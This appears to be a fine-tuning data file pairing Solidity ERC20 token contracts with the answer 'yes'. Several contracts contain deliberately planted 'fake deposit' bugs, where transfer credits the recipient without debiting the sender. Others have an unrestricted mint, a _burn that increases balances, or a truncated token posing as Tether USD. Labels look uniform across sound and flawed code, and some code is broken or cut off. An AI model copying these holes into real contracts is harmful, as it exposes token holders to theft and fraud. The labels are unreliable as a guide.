{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Hexaputon is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Hexaputon\";\r\n    string public constant symbol = \"HEXA\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"\/\/ File: test3.sol\r\n\r\npragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n\/\/\/ @return total amount of tokens\r\nfunction totalSupply() constant returns (uint256 supply) {}\r\n\r\n\/\/\/ @param _owner The address from which the balance will be retrieved\r\n\/\/\/ @return The balance\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n\/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\n\/\/\/ @param _to The address of the recipient\r\n\/\/\/ @param _value The amount of token to be transferred\r\n\/\/\/ @return Whether the transfer was successful or not\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n\/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n\/\/\/ @param _from The address of the sender\r\n\/\/\/ @param _to The address of the recipient\r\n\/\/\/ @param _value The amount of token to be transferred\r\n\/\/\/ @return Whether the transfer was successful or not\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n\/\/\/ @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n\/\/\/ @param _spender The address of the account able to transfer the tokens\r\n\/\/\/ @param _value The amount of wei to be approved for transfer\r\n\/\/\/ @return Whether the approval was successful or not\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n\/\/\/ @param _owner The address of the account owning tokens\r\n\/\/\/ @param _spender The address of the account able to transfer the tokens\r\n\/\/\/ @return Amount of remaining tokens allowed to spent\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n    if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n    return true;\r\n    } else { return false; }\r\n}\r\n\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n    return balances[_owner];\r\n}\r\n\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n    return true;\r\n}\r\n\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n    return allowed[_owner][_spender];\r\n}\r\n\r\nmapping (address => uint256) balances;\r\nmapping (address => mapping (address => uint256)) allowed;\r\nuint256 public totalSupply;\r\n}\r\n\r\n\/\/name this contract whatever you’d like\r\ncontract ERC20Token is StandardToken {\r\n\r\nfunction () {\r\n\/\/if ether is sent to this address, send it back.\r\nthrow;\r\n}\r\n\r\n\r\nstring public name; \r\nuint8 public decimals; \r\nstring public symbol; \r\nstring public version = 'H1.0'; \r\n\r\n\r\nfunction ERC20Token() {\r\n    balances[msg.sender] = 30000000000000; \r\n        totalSupply = 30000000000000; \r\n        name = \"SHRUG\"; \r\n        decimals = 18; \r\n        symbol = \"SHRG\"; \r\n    }\r\n\r\n    \r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    Approval(msg.sender, _spender, _value);\r\n\r\n    if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract AdvancedToken is IERC20 {\r\n    string public constant name = \"Advanced Token\";\r\n    string public constant symbol = \"ATX\";\r\n    uint8 public constant decimals = 18;\r\n\r\n    address public developmentFund;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n\r\n    constructor(address _developmentFund) public {\r\n        developmentFund = _developmentFund;\r\n        _totalSupply = 50000000 * (10 ** uint256(decimals));\r\n        _balances[developmentFund] = _totalSupply;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        require(recipient != address(0), \"ATX: transfer to the zero address\");\r\n\r\n        \/\/ Fake deposit bug: the sender's balance isn't decreased\r\n        _balances[recipient] += amount;\r\n        emit Transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[sender] >= amount, \"ATX: transfer amount exceeds balance\");\r\n        require(_allowances[sender][msg.sender] >= amount, \"ATX: transfer amount exceeds allowance\");\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function mint(address account, uint256 amount) public returns (bool) {\r\n        require(account != address(0), \"ATX: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n        return true;\r\n    }\r\n\r\n    function burn(address account, uint256 amount) public returns (bool)\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ComplexERC20 is IERC20 {\r\n    string public constant name = \"Complex Token\";\r\n    string public constant symbol = \"CTX\";\r\n    uint8 public constant decimals = 18;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint256 private _totalSupply = 1000000000000000000000000000; \/\/ 1 million tokens\r\n    uint256 public transferFee = 5; \/\/ Fee for every transaction\r\n\r\n    address payable public feeCollector;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[msg.sender] >= amount, \"Insufficient balance\");\r\n        \r\n        uint256 fee = amount * transferFee \/ 100;\r\n        uint256 amountToTransfer = amount - fee;\r\n\r\n        _balances[recipient] += amountToTransfer;\r\n        \/\/ Fake deposit bug, not updating sender's balance\r\n        feeCollector.transfer(fee);\r\n        emit Transfer(msg.sender, recipient, amountToTransfer);\r\n        emit Transfer(msg.sender, feeCollector, fee);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[sender] >= amount, \"Insufficient balance\");\r\n        require(_allowances[sender][msg.sender] >= amount, \"Insufficient allowance\");\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    constructor(address payable _feeCollector) public {\r\n        feeCollector = _feeCollector;\r\n        _balances[msg.sender] = _totalSupply;\r\n    }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"function transfer(address _to, uint256 _value) public override returns (bool ok) {\r\n        \/\/ block transfers if the recipient only allows kyc input, check other factors\r\n        if (onlyAcceptsKycInput[_to] == false && balances[msg.sender][ShyftTokenType] >= _value) {\r\n            balances[msg.sender][ShyftTokenType] = balances[msg.sender][ShyftTokenType].sub(_value);\r\n\r\n            balances[_to][ShyftTokenType] = balances[_to][ShyftTokenType].add(_value);\r\n\r\n            emit Transfer(msg.sender, _to, _value);\r\n\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n\/\/ this is the basics of creating an ERC20 token\r\n\/\/change the name Henri and the symbol to whatever you would like\r\n\r\ncontract RichMan is ERC20 {\r\n    string public constant symbol = \"RICH\";\r\n    string public constant name = \"Richman Coin\";\r\n    uint8 public constant decimals = 18;\r\n \r\n    \/\/100,000\r\n    uint private constant __totalSupply = 100000000000000000000000;\r\n\r\n    \/\/this mapping is where we store the balances of an address\r\n    mapping (address => uint) private __balanceOf;\r\n\r\n    \/\/This is a mapping of a mapping.  This is for the approval function to determine how much an address can spend\r\n    mapping (address => mapping (address => uint)) private __allowances;\r\n\r\n    \/\/the creator of the contract has the total supply and no one can create tokens\r\n    constructor() public {\r\n        __balanceOf[msg.sender] = __totalSupply;\r\n    }\r\n\r\n    \/\/constant value that does not change\/  returns the amount of initial tokens to display\r\n    function totalSupply() public view override returns (uint _totalSupply) {\r\n        _totalSupply = __totalSupply;\r\n    }\r\n\r\n    \/\/returns the balance of a specific address\r\n    function balanceOf(address _addr) public view override returns (uint balance) {\r\n        return __balanceOf[_addr];\r\n    }\r\n    \r\n\r\n    \/\/transfer an amount of tokens to another address.  The transfer needs to be >0 \r\n    \/\/does the msg.sender have enough tokens to forfill the transfer\r\n    \/\/decrease the balance of the sender and increase the balance of the to address\r\n    function transfer(address _to, uint _value) public override returns (bool success) {\r\n        if (_value > 0 && _value <= balanceOf(msg.sender)) {\r\n            __balanceOf[msg.sender] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    \r\n    \/\/this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\r\n    \/\/If the 3rd party has an allowance of >0 \r\n    \/\/and the value to transfer is >0 \r\n    \/\/and the allowance is >= the value of the transfer\r\n    \/\/and it is not a contract\r\n    \/\/perform the transfer by increasing the to account and decreasing the from accounts\r\n    function transferFrom(address _from, address _to, uint _value) public override returns (bool success) {\r\n        if (__allowances[_from][msg.sender] > 0 &&\r\n            _value >0 &&\r\n            __allowances[_from][msg.sender] >= _value\r\n            \/\/  the to address is not a contract\r\n            && !isContract(_to)) {\r\n            __balanceOf[_from] -= _value;\r\n            __balanceOf[_to] += _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    \/\/This check is to determine if we are sending to a contract?\r\n    \/\/Is there code at this address?  If the code size is greater then 0 then it is a contract.\r\n    function isContract(address _addr) public view returns (bool) {\r\n        uint codeSize;\r\n        \/\/in line assembly code\r\n        assembly {\r\n            codeSize := extcodesize(_addr)\r\n        }\r\n        \/\/ i=s code size > 0  then true\r\n        return codeSize > 0;    \r\n    }\r\n\r\n \r\n    \/\/allows a spender address to spend a specific amount of value\r\n    function approve(address _spender, uint _value) external override returns (bool success) {\r\n        __allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    \/\/shows how much a spender has the approval to spend to a specific address\r\n    function allowance(address _owner, address _spender) external override view returns (uint remaining) {\r\n        return __allowances[_owner][_spender];\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    \/\/\/ @param _owner The address from which the balance will be retrieved\r\n    \/\/\/ @return The balance\r\n    function balanceOf(address _owner) public constant returns (uint balance);\r\n\r\n    \/\/\/ @notice send `_value` token to `_to` from `msg.sender`\r\n    \/\/\/ @param _to The address of the recipient\r\n    \/\/\/ @param _value The amount of token to be transferred\r\n    \/\/\/ @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) public returns (bool success);\r\n\r\n    \/\/\/ @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    \/\/\/ @param _from The address of the sender\r\n    \/\/\/ @param _to The address of the recipient\r\n    \/\/\/ @param _value The amount of token to be transferred\r\n    \/\/\/ @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success);\r\n\r\n    \/\/\/ @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\n    \/\/\/ @param _value The amount of wei to be approved for transfer\r\n    \/\/\/ @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) public returns (bool success);\r\n\r\n    \/\/\/ @param _owner The address of the account owning tokens\r\n    \/\/\/ @param _spender The address of the account able to transfer the tokens\r\n    \/\/\/ @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n    uint constant private MAX_UINT = 2**256 - 1;\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n\r\n    function transfer(address _to, uint _value) public returns (bool success) {\r\n        \/\/Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool success)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n            && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public constant returns (uint balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n}\r\n\r\ncontract IOSToken is RegularToken {\r\n\r\n    uint constant public totalSupply = 90*10**27;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"Wrapped IOST\";\r\n    string constant public symbol = \"IOST\";\r\n\r\n    function IOSToken() public {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"contract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity =0.8.1;\r\n\r\nimport \".\/IERC20.sol\";\r\nimport \".\/Context.sol\";\r\n\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    mapping (address =u003e uint256) internal _balances;\r\n    mapping (address =u003e mapping (address =u003e uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    string internal _name;\r\n    string internal _symbol;\r\n\r\n    constructor (string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        _balances[account] = accountBalance + amount;\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract MyToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000*10**uint256(decimals);\r\n    string public constant name = \"MyToken\";\r\n    string public constant symbol = \"MTK\";\r\n    address payable teamAddress;\r\n    \r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        \/\/ Fake deposit bug here: balance is not decremented\r\n        balances[to] += value;\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract StakingContract is IERC20 {\r\n    string public constant name = \"Staking Token\";\r\n    string public constant symbol = \"STK\";\r\n    uint8 public constant decimals = 18;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _stakes;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply = 1000000000000000000000000000; \/\/ 1 million tokens\r\n    uint256 public stakingRewards = 10; \/\/ Percentage rewards for staking\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function stakedBalanceOf(address account) public view returns (uint256) {\r\n        return _stakes[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[msg.sender] >= amount, \"Insufficient balance\");\r\n\r\n        _balances[recipient] += amount;\r\n        emit Transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        require(_balances[sender] >= amount, \"Insufficient balance\");\r\n        require(_allowances[sender][msg.sender] >= amount, \"Insufficient allowance\");\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function stakeTokens(uint256 amount) public returns (bool) {\r\n        require(_balances[msg.sender] >= amount, \"Insufficient balance to stake\");\r\n\r\n        _balances[msg.sender] -= amount;\r\n        _stakes[msg.sender] += amount;\r\n        return true;\r\n    }\r\n\r\n    function claimStakeRewards() public returns (bool) {\r\n        require(_stakes[msg.sender] > 0, \"No staked tokens\");\r\n\r\n        uint256 reward = _stakes[msg.sender] * stakingRewards \/ 100;\r\n        _balances[msg.sender] += reward;\r\n        emit Transfer(address(0), msg.sender, reward);\r\n        return true;\r\n    }\r\n\r\n    constructor() public {\r\n        _balances[msg.sender] = _totalSupply;\r\n    }\r\n}\r\n\n\n###\n\n","completion":" yes"}
{"prompt":"\/\/ SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.6.7;\r\n\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint _totalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n\r\n}\r\n\r\n\/\/ this is the basics of creating an ERC20 token\r\n\/\/change the name Henri and the symbol to whatever you would like\r\n\r\ncontract Loeker is ERC20 {\r\n    string public constant symbol = \"USDT\";\r\n    string public constant name = \"Tether USD\";\r\n    uint8 public constant decimals = 10;\r\n \r\n    \/\/1,000,000+10 zeros\r\n    uint private constant __totalSupply = 